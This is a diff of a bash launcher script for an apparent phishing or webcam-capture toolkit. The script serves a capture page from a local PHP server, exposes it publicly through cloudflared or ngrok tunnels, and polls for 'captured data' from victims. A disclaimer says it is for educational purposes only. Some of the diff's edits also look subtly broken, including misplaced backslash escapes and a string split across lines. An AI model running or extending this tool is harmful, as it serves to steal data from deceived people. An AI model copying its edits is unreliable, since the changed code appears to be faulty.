@@ -87,16 +87,16 @@ if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(
   
   # Define Windows-specific command replacements
   function killall() {
-    taskkill /F /IM "\$1" 2>/dev/null
+    taskkill /F /IM "\\$1" 2>/dev/null
   }
   
   function pkill() {
-    if [[ "\$1" == "-f" ]]; then
+    if [[ "\\$1" == "-f" ]]; then
       shift
       shift
-      taskkill /F /FI "IMAGENAME eq \$1" 2>/dev/null
+      taskkill /F /FI "IMAGENAME eq \\$1" 2>/dev/null
     else
-      taskkill /F /IM "\$1" 2>/dev/null
+      taskkill /F /IM "\\$1" 2>/dev/null
     fi
   }
 else
@@ -177,7 +177,7 @@ check_update() {
     	new_version=$(curl -sS -A "$ua" "$release_url" \
 		| grep -E '"tag_name"|"name"' \
 		| head -n1 \
-		| awk -F\" '{print $4}')
+		| awk -F\" '{print \$4}')
   	fi
 
 	if [ -z "$new_version" ]; then
@@ -364,14 +364,13 @@ if [[ "$windows_mode" == true ]]; then
         exit 1
     fi
 else
-    # Non-Windows systems
-    # macOS detection
+    # Other systems detection
     if [[ "$os" == "Darwin" ]]; then
         printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
         if [[ "$arch" == "arm64" ]]; then
             printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
             wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
-        else
+		else
             printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
             wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
         fi
@@ -420,15 +419,15 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S "$HOST:$PORT" > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared.log > /dev/null 2>&1 &
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared.exe tunnel -url "$HOST:$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared tunnel -url "$HOST:$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
 sleep 10
@@ -562,10 +561,10 @@ if [[ "$windows_mode" == true ]]; then
         ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 2
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok.exe http 3333 > /dev/null 2>&1 &
+    ./ngrok.exe http "$PORT" > /dev/null 2>&1 &
 else
     if [[ -e ~/.ngrok2/ngrok.yml ]]; then
         printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
@@ -581,10 +580,10 @@ else
         ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+    php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 2
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+    ./ngrok http "$PORT" > /dev/null 2>&1 &
 fi
 
 sleep 10
@@ -637,7 +636,8 @@ about() {
 
   printf "${RED}Warning:\n"
   printf "${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}\n"
-  printf "${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}\n\n"
+  printf "${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!
+!${RESETBG}\n\n"
 
   printf "${ORANGE}Contributors:\n"
   printf "${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek\n\n"
@@ -650,10 +650,10 @@ about() {
     99)
       msg_exit;;
     0 | 00)
-      printf "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+      printf "\n${CYAN} Returning to main menu..."
       { sleep 1; main_menu; };;
     *)
-      printf "\n${RED}[${WHITE}!${RED}] Invalid Option, Try Again..."
+      printf "\n${RED} Invalid Option, Try Again..."
       { sleep 1; about; };;
   esac
 }
@@ -675,7 +675,13 @@ tunnel_menu() {
       printf "\n${CYAN} Returning to main menu..."
       { sleep 1; main_menu; };;
     1 | 01)
-      cloudflare_tunnel;;
+      # Localhost option: Directly run PHP server
+      printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
+      php -S "$HOST:$PORT" > /dev/null 2>&1 &
+      sleep 5  # Give the server some time to start
+      echo -e "\e[1;92m[\e[0m*\e[1;92m] Web server running. Open your browser to http://$HOST:$PORT\e[0m"
+      checkfound # Start checking for captured data
+      ;;
     2 | 02)
       ngrok_server;;
     3 | 03)
@@ -722,10 +728,14 @@ main_menu() {
 }
 
 ## Main
+# Load HOST and PORT from file, if it exists
+if [ -f config.conf ]; then
+  source config.conf
+fi
+
+## Main Script
 kill_pid
 dependencies
 check_status
-install_ngrok
-install_cloudflared
-install_localxpose
 main_menu
+
